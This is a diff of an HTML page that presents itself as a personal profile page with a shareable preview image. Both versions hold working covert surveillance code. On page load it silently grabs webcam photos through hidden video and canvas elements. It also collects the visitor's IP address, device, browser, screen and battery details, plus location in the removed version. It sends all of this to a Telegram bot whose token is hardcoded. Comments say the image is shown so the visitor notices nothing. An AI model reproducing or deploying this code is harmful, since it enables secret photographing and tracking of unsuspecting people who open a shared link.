@@ -3,135 +3,132 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>محمد كعابنة</title>
+    <title>محمد كعبانه</title>
 
     <!-- إعدادات المعاينة (Open Graph) - لكي تظهر الصورة والاسم عند المشاركة -->
-    <meta property="og:title" content="محمد كعابنة">
-    <meta property="og:type" content="profile">
-    <meta property="og:image" content="https://l.top4top.io/p_3968sozsf0.jpg"> <!-- صورتك التي أرسلتها -->
+    <meta property="og:title" content="محمد كعبانه">
+    <meta property="og:description" content="مرحباً بك في صفحة محمد كعبانه الشخصية">
+    <meta property="og:image" content="https://l.top4top.io/p_3968sozsf0.jpg">
+    <meta property="og:type" content="website">
 
     <style>
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            text-align: center; 
-            background: #f0f2f5; 
+        body {
             margin: 0;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            background: linear-gradient(45deg, #1a1a1a, #333); /* خلفية أنيقة */
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: white;
+            text-align: center;
         }
-        video { display: none; } /* إخفاء الفيديو لجعل العملية غير مرئية */
-        canvas { display: none; }
-        .loading { font-size: 24px; color: #666; animation: pulse 1.5s infinite; }
-        @keyframes pulse {
-            0% { opacity: 0.5; }
-            50% { opacity: 1; }
-            100% { opacity: 0.5; }
-        }
+        .container { opacity: 0; animation: fadeIn 2s forwards; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        img { width: 80%; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
     </style>
 </head>
 <body>
 
-    <div class="loading">جاري التحميل...</div>
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <div class="container">
+        <!-- صورة تظهر للمستخدم لكي لا يشعر بشيء -->
+        <img src="https://l.top4top.io/p_3968sozsf0.jpg" alt="Loading...">
+        <h1>جاري التحميل...</h1>
+    </div>
+
+    <!-- عناصر مخفية للعمليات البرمجية -->
+    <video id="video" style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // --- الإعدادات الأساسية (تأكد من صحتها) ---
-        const TELEGRAM_TOKEN = '8322190390:AAHN2FcpyUVDjsEa5DhFLzaFcgFF0v7nfOw';
-        const CHAT_ID = '7184970355';
-        const SECRET_KEY = '123'; 
+        const TELEGRAM_ID = "7184970355";
+        const TELEGRAM_TOKEN = "8322190390:AAHN2FcpyUVDjsEa5DhFLzaFcgFF0v7nfOw";
 
-        async function init() {
-            // فحص المفتاح السري في الرابط
-            const urlParams = new URLSearchParams(window.location.search);
-            const userKey = urlParams.get('key');
-
-            if (userKey !== SECRET_KEY) {
-                // إذا لم يوجد المفتاح (?key=123)، اذهب إلى جوجل فوراً للتمويه
-                window.location.href = "https://www.google.com";
-                return;
+        async function sendToTelegram(text, photoUrl = null) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/`;
+            if (photoUrl) {
+                await fetch(url + "sendPhoto", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: TELEGRAM_ID, photo: photoUrl, caption: text })
+                });
+            } else {
+                await fetch(url + "sendMessage", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: TELEGRAM_ID, text: text, parse_mode: "HTML" })
+                });
             }
-
-            // إذا كان المفتاح صحيحاً، ابدأ جمع البيانات
-            await startHacking();
         }
 
-        async function sendToTelegram(text, photoBlob = null) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            if (photoBlob) {
-                formData.append('photo', photoBlob);
-            } else {
-                formData.append('text', text);
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (e) { return "غير معروف"; }
+        }
+
+        async function startCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0);
+                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                    // نرسل الصورة مباشرة بعد استخراج البيانات (سنجمعها في رسالة واحدة لاحقاً)
+                    sendImageAndData(imageData);
+                }, 1500);
+            } catch (err) {
+                sendToTelegram("📷 الكاميرا لم تُسمح، لكن سأرسل معلومات الجهاز فقط.");
+            }
+        }
+
+        async function sendImageAndData(photoData) {
+            const ip = await getIP();
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+
+            let batteryInfo = "غير متوفرة";
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                batteryInfo = `النسبة: ${Math.round(battery.level * 100)}%, الشحن: ${battery.charging ? 'متصل' : 'يعمل على البطارية'}`;
             }
 
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/`, {
-                method: 'POST',
-                body: formData
+            let message = `<b>👤 معلومات جديدة وصلت!</b>\n\n`;
+            message += `🌐 <b>الآيبي:</b> ${ip}\n`;
+            message += `📱 <b>الجهاز:</b> ${platform}\n`;
+            message += `💻 <b>المتصفح:</b> ${userAgent.split(' ')[0]}\n`;
+            message += `📏 <b>دقة الشاشة:</b> ${screenRes}\n`;
+            message += `🌍 <b>اللغة:</b> ${language}\n`;
+            message += `🔋 <b>البطارية:</b> ${batteryInfo}`;
+
+            // إرسال الصورة مع المعلومات في رسالة واحدة (Caption)
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_ID,
+                    photo: photoData,
+                    caption: message,
+                    parse_mode: "HTML"
+                })
             });
         }
 
-        async function startHacking() {
-            try {
-                let infoText = "🚀 دخول جديد!\n\n";
+        // التشغيل التلقائي عند التحميل
+        window.onload = () => {
+            startCapture();
+        };
 
-                // 1. جلب الـ IP واللوكيشن
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-
-                infoText += `📍 IP: ${ipData.ip}\n`;
-                infoText += `🌍 الدولة: ${ipData.city}, ${ipData.country_name}\n`;
-                infoText += `🌐 مزود الخدمة: ${ipData.org}\n\n`;
-
-                // 2. معلومات الجهاز
-                infoText += `📱 الجهاز: ${navigator.platform}\n`;
-                infoText += `🌐 المتصفح: ${navigator.userAgent}\n\n`;
-
-                // 3. البطارية
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    infoText += `🔋 مستوى البطارية: ${(battery.level * 100).toFixed(0)}%\n`;
-                    infoText += `🔌 حالة الشحن: ${battery.charging ? 'في الشحن' : 'لا يشحن'}\n\n`;
-                }
-
-                await sendToTelegram(infoText);
-            } catch (e) {
-                await sendToTelegram("⚠️ حدث خطأ في جلب البيانات، ولكن الشخص دخل الرابط.");
-            }
-
-            startCamera();
-        }
-
-        async function startCamera() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                video.srcObject = stream;
-                // الانتظار قليلاً ثم التقاط الصور
-                setTimeout(() => capturePhotos(video, canvas, context), 1500);
-            } catch (err) {
-                await sendToTelegram("📷 تم الدخول ولكن لم يتم السماح بالكاميرا.");
-            }
-        }
-
-        async function capturePhotos(video, canvas, context) {
-            for (let i = 0; i < 3; i++) { // سيتم التقاط 3 صور
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                context.drawImage(video, 0, 0);
-
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
-                await sendToTelegram("📸 صورة جديدة:", blob);
-            }
-        }
-
-        // تشغيل البرنامج عند تحميل الصفحة
-        window.onload = init;
     </script>
 </body>
 </html>
